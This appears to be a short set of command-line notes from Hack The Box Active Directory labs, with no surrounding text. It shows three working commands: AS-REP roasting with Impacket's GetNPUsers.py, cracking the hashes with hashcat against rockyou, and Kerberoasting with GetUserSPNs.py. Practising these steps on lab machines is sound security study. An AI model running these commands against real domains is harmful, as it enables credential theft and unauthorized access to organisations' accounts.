




```
GetNPUsers.py 'EGOTISTICAL-BANK.LOCAL/' -usersfile users.txt -format hashcat -outputfile hashes.aspreroast -dc-ip 10.10.10.175
```



```
hashcat -m 18200 hashes.aspreroast /usr/share/wordlists/rockyou.txt --force
```


```
GetUserSPNs.py -request -dc-ip 10.129.193.5 active.htb/svc_tgs
```